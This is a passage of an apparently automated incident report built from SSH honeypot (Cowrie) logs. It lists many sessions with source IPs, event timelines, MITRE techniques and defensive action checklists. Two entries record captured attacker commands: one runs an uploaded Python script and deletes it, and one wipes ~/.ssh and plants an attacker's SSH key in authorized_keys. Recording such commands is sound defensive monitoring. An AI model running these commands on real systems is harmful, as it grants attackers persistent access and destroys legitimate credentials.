| `2026-09-05 17:32:23` | `cowrie.session.connect` |
| `2026-09-05 17:32:23` | `cowrie.client.version` |
| `2026-09-05 17:32:23` | `cowrie.client.kex` |
| `2026-09-05 17:32:23` | `cowrie.login.success` |
| `2026-09-05 17:32:24` | `cowrie.session.params` |
| `2026-09-05 17:32:24` | `cowrie.command.input` |
| `2026-09-05 17:32:24` | `cowrie.log.closed` |
| `2026-09-05 17:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2f05cfea88

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:32 |
| **Last Seen** | 2026-09-05 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:32:37` | `cowrie.session.connect` |
| `2026-09-05 17:32:37` | `cowrie.client.version` |
| `2026-09-05 17:32:37` | `cowrie.client.kex` |
| `2026-09-05 17:32:37` | `cowrie.login.success` |
| `2026-09-05 17:32:38` | `cowrie.session.params` |
| `2026-09-05 17:32:38` | `cowrie.command.input` |
| `2026-09-05 17:32:38` | `cowrie.log.closed` |
| `2026-09-05 17:32:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7c779410e9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:32 |
| **Last Seen** | 2026-09-05 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:32:51` | `cowrie.session.connect` |
| `2026-09-05 17:32:51` | `cowrie.client.version` |
| `2026-09-05 17:32:51` | `cowrie.client.kex` |
| `2026-09-05 17:32:51` | `cowrie.login.success` |
| `2026-09-05 17:32:52` | `cowrie.session.params` |
| `2026-09-05 17:32:52` | `cowrie.command.input` |
| `2026-09-05 17:32:52` | `cowrie.log.closed` |
| `2026-09-05 17:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7b1ecd242c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:33 |
| **Last Seen** | 2026-09-05 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:33:06` | `cowrie.session.connect` |
| `2026-09-05 17:33:06` | `cowrie.client.version` |
| `2026-09-05 17:33:06` | `cowrie.client.kex` |
| `2026-09-05 17:33:06` | `cowrie.login.success` |
| `2026-09-05 17:33:06` | `cowrie.session.params` |
| `2026-09-05 17:33:06` | `cowrie.command.input` |
| `2026-09-05 17:33:06` | `cowrie.log.closed` |
| `2026-09-05 17:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-323ad0ff5925

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:33 |
| **Last Seen** | 2026-09-05 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:33:20` | `cowrie.session.connect` |
| `2026-09-05 17:33:20` | `cowrie.client.version` |
| `2026-09-05 17:33:20` | `cowrie.client.kex` |
| `2026-09-05 17:33:20` | `cowrie.login.success` |
| `2026-09-05 17:33:21` | `cowrie.session.params` |
| `2026-09-05 17:33:21` | `cowrie.command.input` |
| `2026-09-05 17:33:21` | `cowrie.log.closed` |
| `2026-09-05 17:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8747be7b2b84

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:33 |
| **Last Seen** | 2026-09-05 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:33:34` | `cowrie.session.connect` |
| `2026-09-05 17:33:34` | `cowrie.client.version` |
| `2026-09-05 17:33:34` | `cowrie.client.kex` |
| `2026-09-05 17:33:34` | `cowrie.login.success` |
| `2026-09-05 17:33:35` | `cowrie.session.params` |
| `2026-09-05 17:33:35` | `cowrie.command.input` |
| `2026-09-05 17:33:35` | `cowrie.log.closed` |
| `2026-09-05 17:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7c8e2bf39f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:33 |
| **Last Seen** | 2026-09-05 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:33:49` | `cowrie.session.connect` |
| `2026-09-05 17:33:49` | `cowrie.client.version` |
| `2026-09-05 17:33:49` | `cowrie.client.kex` |
| `2026-09-05 17:33:49` | `cowrie.login.success` |
| `2026-09-05 17:33:49` | `cowrie.session.params` |
| `2026-09-05 17:33:49` | `cowrie.command.input` |
| `2026-09-05 17:33:49` | `cowrie.log.closed` |
| `2026-09-05 17:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c29fa264b98

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:03` | `cowrie.session.connect` |
| `2026-09-05 17:34:03` | `cowrie.client.version` |
| `2026-09-05 17:34:03` | `cowrie.client.kex` |
| `2026-09-05 17:34:03` | `cowrie.login.success` |
| `2026-09-05 17:34:04` | `cowrie.session.params` |
| `2026-09-05 17:34:04` | `cowrie.command.input` |
| `2026-09-05 17:34:04` | `cowrie.log.closed` |
| `2026-09-05 17:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378681b643d4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:17` | `cowrie.session.connect` |
| `2026-09-05 17:34:17` | `cowrie.client.version` |
| `2026-09-05 17:34:17` | `cowrie.client.kex` |
| `2026-09-05 17:34:17` | `cowrie.login.success` |
| `2026-09-05 17:34:18` | `cowrie.session.params` |
| `2026-09-05 17:34:18` | `cowrie.command.input` |
| `2026-09-05 17:34:18` | `cowrie.log.closed` |
| `2026-09-05 17:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd3ecdd56a0

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:29` | `cowrie.session.connect` |
| `2026-09-05 17:34:29` | `cowrie.client.version` |
| `2026-09-05 17:34:29` | `cowrie.client.kex` |
| `2026-09-05 17:34:29` | `cowrie.login.success` |
| `2026-09-05 17:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0aebbec700

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:30` | `cowrie.session.connect` |
| `2026-09-05 17:34:30` | `cowrie.client.version` |
| `2026-09-05 17:34:30` | `cowrie.client.kex` |
| `2026-09-05 17:34:30` | `cowrie.login.success` |
| `2026-09-05 17:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5b8a6e88f1

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:31` | `cowrie.session.connect` |
| `2026-09-05 17:34:31` | `cowrie.client.version` |
| `2026-09-05 17:34:31` | `cowrie.client.kex` |
| `2026-09-05 17:34:31` | `cowrie.login.success` |
| `2026-09-05 17:34:33` | `cowrie.session.file_upload` |
| `2026-09-05 17:34:34` | `cowrie.session.params` |
| `2026-09-05 17:34:34` | `cowrie.command.input` |
| `2026-09-05 17:34:34` | `cowrie.command.input` |
| `2026-09-05 17:34:34` | `cowrie.command.input` |
| `2026-09-05 17:34:34` | `cowrie.command.failed` |
| `2026-09-05 17:34:34` | `cowrie.log.closed` |
| `2026-09-05 17:34:35` | `cowrie.session.params` |
| `2026-09-05 17:34:35` | `cowrie.command.input` |
| `2026-09-05 17:34:35` | `cowrie.log.closed` |
| `2026-09-05 17:34:36` | `cowrie.session.params` |
| `2026-09-05 17:34:36` | `cowrie.command.input` |
| `2026-09-05 17:34:36` | `cowrie.log.closed` |
| `2026-09-05 17:34:36` | `cowrie.session.params` |
| `2026-09-05 17:34:36` | `cowrie.command.input` |
| `2026-09-05 17:34:36` | `cowrie.command.failed` |
| `2026-09-05 17:34:36` | `cowrie.command.failed` |
| `2026-09-05 17:35:37` | `cowrie.session.params` |
| `2026-09-05 17:35:37` | `cowrie.command.input` |
| `2026-09-05 17:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad6a44aecc8

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:32` | `cowrie.session.connect` |
| `2026-09-05 17:34:32` | `cowrie.client.version` |
| `2026-09-05 17:34:32` | `cowrie.client.kex` |
| `2026-09-05 17:34:32` | `cowrie.login.success` |
| `2026-09-05 17:34:33` | `cowrie.session.params` |
| `2026-09-05 17:34:33` | `cowrie.command.input` |
| `2026-09-05 17:34:33` | `cowrie.log.closed` |
| `2026-09-05 17:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5422a8944e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:34 |
| **Last Seen** | 2026-09-05 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:34:47` | `cowrie.session.connect` |
| `2026-09-05 17:34:47` | `cowrie.client.version` |
| `2026-09-05 17:34:47` | `cowrie.client.kex` |
| `2026-09-05 17:34:47` | `cowrie.login.success` |
| `2026-09-05 17:34:47` | `cowrie.session.params` |
| `2026-09-05 17:34:47` | `cowrie.command.input` |
| `2026-09-05 17:34:48` | `cowrie.log.closed` |
| `2026-09-05 17:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d34373c42e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:35 |
| **Last Seen** | 2026-09-05 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:35:01` | `cowrie.session.connect` |
| `2026-09-05 17:35:01` | `cowrie.client.version` |
| `2026-09-05 17:35:01` | `cowrie.client.kex` |
| `2026-09-05 17:35:01` | `cowrie.login.success` |
| `2026-09-05 17:35:02` | `cowrie.session.params` |
| `2026-09-05 17:35:02` | `cowrie.command.input` |
| `2026-09-05 17:35:02` | `cowrie.log.closed` |
| `2026-09-05 17:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99192f10d3db

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:35 |
| **Last Seen** | 2026-09-05 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:35:15` | `cowrie.session.connect` |
| `2026-09-05 17:35:15` | `cowrie.client.version` |
| `2026-09-05 17:35:15` | `cowrie.client.kex` |
| `2026-09-05 17:35:15` | `cowrie.login.success` |
| `2026-09-05 17:35:16` | `cowrie.session.params` |
| `2026-09-05 17:35:16` | `cowrie.command.input` |
| `2026-09-05 17:35:16` | `cowrie.log.closed` |
| `2026-09-05 17:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a48d479b02a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:35 |
| **Last Seen** | 2026-09-05 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:35:30` | `cowrie.session.connect` |
| `2026-09-05 17:35:30` | `cowrie.client.version` |
| `2026-09-05 17:35:30` | `cowrie.client.kex` |
| `2026-09-05 17:35:30` | `cowrie.login.success` |
| `2026-09-05 17:35:31` | `cowrie.session.params` |
| `2026-09-05 17:35:31` | `cowrie.command.input` |
| `2026-09-05 17:35:31` | `cowrie.log.closed` |
| `2026-09-05 17:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb034728aaa4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:35 |
| **Last Seen** | 2026-09-05 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:35:44` | `cowrie.session.connect` |
| `2026-09-05 17:35:44` | `cowrie.client.version` |
| `2026-09-05 17:35:44` | `cowrie.client.kex` |
| `2026-09-05 17:35:44` | `cowrie.login.success` |
| `2026-09-05 17:35:45` | `cowrie.session.params` |
| `2026-09-05 17:35:45` | `cowrie.command.input` |
| `2026-09-05 17:35:45` | `cowrie.log.closed` |
| `2026-09-05 17:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173fd1de827a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:35 |
| **Last Seen** | 2026-09-05 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:35:59` | `cowrie.session.connect` |
| `2026-09-05 17:35:59` | `cowrie.client.version` |
| `2026-09-05 17:35:59` | `cowrie.client.kex` |
| `2026-09-05 17:35:59` | `cowrie.login.success` |
| `2026-09-05 17:35:59` | `cowrie.session.params` |
| `2026-09-05 17:35:59` | `cowrie.command.input` |
| `2026-09-05 17:35:59` | `cowrie.log.closed` |
| `2026-09-05 17:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee82b7ada3a

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:13` | `cowrie.session.connect` |
| `2026-09-05 17:36:13` | `cowrie.client.version` |
| `2026-09-05 17:36:13` | `cowrie.client.kex` |
| `2026-09-05 17:36:13` | `cowrie.login.success` |
| `2026-09-05 17:36:13` | `cowrie.session.params` |
| `2026-09-05 17:36:13` | `cowrie.command.input` |
| `2026-09-05 17:36:13` | `cowrie.log.closed` |
| `2026-09-05 17:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be02f6e009e6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:27` | `cowrie.session.connect` |
| `2026-09-05 17:36:27` | `cowrie.client.version` |
| `2026-09-05 17:36:27` | `cowrie.client.kex` |
| `2026-09-05 17:36:27` | `cowrie.login.success` |
| `2026-09-05 17:36:28` | `cowrie.session.params` |
| `2026-09-05 17:36:28` | `cowrie.command.input` |
| `2026-09-05 17:36:28` | `cowrie.log.closed` |
| `2026-09-05 17:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0263a0af0cb4

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:29` | `cowrie.session.connect` |
| `2026-09-05 17:36:29` | `cowrie.client.version` |
| `2026-09-05 17:36:29` | `cowrie.client.kex` |
| `2026-09-05 17:36:31` | `cowrie.login.success` |
| `2026-09-05 17:36:32` | `cowrie.session.params` |
| `2026-09-05 17:36:32` | `cowrie.command.input` |
| `2026-09-05 17:36:32` | `cowrie.command.failed` |
| `2026-09-05 17:36:33` | `cowrie.log.closed` |
| `2026-09-05 17:36:33` | `cowrie.session.params` |
| `2026-09-05 17:36:33` | `cowrie.command.input` |
| `2026-09-05 17:36:34` | `cowrie.session.file_download` |
| `2026-09-05 17:36:34` | `cowrie.log.closed` |
| `2026-09-05 17:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d2e0624379

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:34` | `cowrie.session.connect` |
| `2026-09-05 17:36:34` | `cowrie.client.version` |
| `2026-09-05 17:36:34` | `cowrie.client.kex` |
| `2026-09-05 17:36:35` | `cowrie.login.success` |
| `2026-09-05 17:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7713aa7ea2a0

| Field | Detail |
|---|---|
| **Source IP** | `103.213.238[.]91` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:36` | `cowrie.session.connect` |
| `2026-09-05 17:36:36` | `cowrie.client.version` |
| `2026-09-05 17:36:36` | `cowrie.client.kex` |
| `2026-09-05 17:36:38` | `cowrie.login.success` |
| `2026-09-05 17:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.213.238[.]91` to AbuseIPDB if not already reported
- [ ] Block `103.213.238[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99696d1db66

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 17:36 |
| **Last Seen** | 2026-09-05 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 17:36:41` | `cowrie.session.connect` |
| `2026-09-05 17:36:41` | `cowrie.client.version` |
| `2026-09-05 17:36:41` | `cowrie.client.kex` |
| `2026-09-05 17:36:41` | `cowrie.login.success` |
| `2026-09-05 17:36:42` | `cowrie.session.params` |
